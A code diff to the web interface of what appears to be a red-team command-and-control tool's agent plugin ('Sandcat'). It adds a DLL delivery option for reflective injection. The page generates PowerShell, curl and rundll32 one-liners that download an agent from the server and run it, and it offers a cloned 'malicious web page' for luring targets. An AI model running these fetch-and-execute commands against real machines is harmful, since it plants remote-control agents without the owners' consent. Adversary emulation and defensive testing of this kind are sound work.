@@ -45,37 +45,59 @@
                 <!-- Access -->
 
                 <div class="section-profile">
-                    <div id="access" class="row">
-                        <div class="column section-border" style="flex:50%">
-                            <h4>Option #1</h4>
-                            <p class="paragraph">
-                                Copy and paste one of the delivery commands into a terminal window.
-                            </p>
-                            <center>
-                            <div>
-                                <label><input type="radio" name="delivery" onclick="show('windows-psh')" />PowerShell</label>
-                                <label><input type="radio" name="delivery" onclick="show('windows-cmd')" />CMD</label>
-                                <label><input type="radio" name="delivery" onclick="show('linux')" />Linux</label>
-                                <label><input type="radio" name="delivery" onclick="show('darwin')" />MacOS</label>
+                    <div id="access" class="row" style="flex-direction: column;">
+                        <div class="" style="display: flex;border-bottom: var(--font-color) 1px solid;">
+                            <div class="column section-border" style="flex:50%">
+                                <h4>Option #1</h4>
+                                <p class="paragraph">
+                                    Copy and paste one of the delivery commands into a terminal window.
+                                </p>
+                                <center>
+                                <div>
+                                    <label><input type="radio" name="delivery" onclick="show('windows-psh', '#delivery-command')" />PowerShell</label>
+                                    <label><input type="radio" name="delivery" onclick="show('windows-cmd', '#delivery-command')" />CMD</label>
+                                    <label><input type="radio" name="delivery" onclick="show('linux', '#delivery-command')" />Linux</label>
+                                    <label><input type="radio" name="delivery" onclick="show('darwin', '#delivery-command')" />MacOS</label>
+                                </div>
+                                </center>
+                                <div class="delivery">
+                                    <code id="delivery-command"></code>
+                                </div>
                             </div>
-                            </center>
-                            <div class="delivery">
-                                <code id="delivery-command"></code>
+                            <div class="column malicious-link" style="flex:50%">
+                                <h4>Option #2</h4>
+                                <p class="paragraph">
+                                    Have each targeted machine navigate to our malicious web page. Then start the downloaded
+                                    54ndc47 agent. Use our sample malicious web page or overwrite it using the website
+                                    cloning button below.
+                                </p>
+                                <a href="/plugin/sandcat/malicious" target="_blank">
+                                    <img src="/sandcat/img/arrow.png"/>
+                                </a>
+                                <br>
+                                <input id="cloneNew" placeholder="Enter a url"/>
+                                <button type="button" class="button-success" onclick="cloneWebsite()">Clone</button>
                             </div>
                         </div>
-                        <div class="column malicious-link" style="flex:50%">
-                            <h4>Option #2</h4>
-                            <p class="paragraph">
-                                Have each targeted machine navigate to our malicious web page. Then start the downloaded
-                                54ndc47 agent. Use our sample malicious web page or overwrite it using the website
-                                cloning button below.
-                            </p>
-                            <a href="/plugin/sandcat/malicious" target="_blank">
-                                <img src="/sandcat/img/arrow.png"/>
-                            </a>
-                            <br>
-                            <input id="cloneNew" placeholder="Enter a url"/>
-                            <button type="button" class="button-success" onclick="cloneWebsite()">Clone</button>
+                        <div class="" style="display: flex;">
+                            <div class="column section-border" style="flex:50%">
+                                <h4>Option #3</h4>
+                                <p class="paragraph">
+                                    Download Sandcat as a shared library (DLL, so, dylib); for use with a Reflective DLL injection (or similar) technique or saving to disk.
+                                    <em>VoidFunc()</em> accepts no arguments, <em>Spawn(server, group, sleep, verbose)</em> accepts a server, group, and sleep string, along with a boolean verbose.  Tested with PowerShellMafia's <em>Invoke-ReflectivePEInjection</em>.
+                                    <br><b>REQUIRES MinGW to be installed server-side</b>
+                                </p>
+                                <center>
+                                <div>
+                                    <label><input type="radio" name="delivery" onclick="show('windows-dll-mem', '#delivery-command-lib')" />Windows DLL<br>(Memory)</label>
+                                    <label><input type="radio" name="delivery" onclick="show('windows-dll-disk', '#delivery-command-lib')" />Windows DLL<br>(Disk)</label>
+                                </div>
+                                </center>
+                                <div class="delivery">
+                                    <code id="delivery-command-lib"></code>
+                                </div>
+                            </div>
+                            <div class="column" style="flex:50%"></div>
                         </div>
                     </div>
                 </div>
@@ -87,8 +109,8 @@
     <script src="/gui/jquery/jquery.js"></script>
     <script src="/gui/js/shared.js"></script>
     <script>
-        function show(identity) {
-            let x = $('#delivery-command');
+        function show(identity, elem) {
+            let x = $(elem);
             let loc = location.protocol+'//'+location.hostname+(location.port ? ':'+location.port: '');
             if(identity === 'windows-psh') {
                 x.text('$url="' + loc + '/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $output="C:\\Users\\Public\\sandcat.exe";$wc.DownloadFile($url,$output); C:\\Users\\Public\\sandcat.exe -server ' + loc + ' -group my_group -v;');
@@ -98,7 +120,11 @@
                 x.text('curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:linux\' '+loc+'/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && /tmp/sandcat-linux -server '+loc+' -group my_group -v;');
             } else if (identity === 'darwin') {
                 x.text('curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:darwin\' '+loc+'/file/download > /tmp/sandcat-darwin && chmod +x /tmp/sandcat-darwin && /tmp/sandcat-darwin -server '+loc+' -group my_group -v;');
-            }
+            } else if(identity === 'windows-dll-mem') {
+				x.text('$url="' + loc + '/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","shared.go"); $wc.Headers.add("DefaultServer","'+loc+'"); $wc.Headers.add("DefaultSleep","60"); $wc.Headers.add("DefaultGroup","my_group"); $PEBytes = $wc.DownloadData($url);');
+			} else if(identity === 'windows-dll-disk') {
+				x.text('$url="' + loc + '/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","shared.go"); $wc.Headers.add("DefaultServer","'+loc+'"); $wc.Headers.add("DefaultSleep","60"); $wc.Headers.add("DefaultGroup","my_group"); $output="C:\\Users\\Public\\sandcat.dll"; $wc.DownloadFile($url,$output); rundll32.exe sandcat.dll,VoidFunc();');
+			}
         }
         function actionDownload(phrase){
             $.getScript('/sandcat/js/malicious.js');
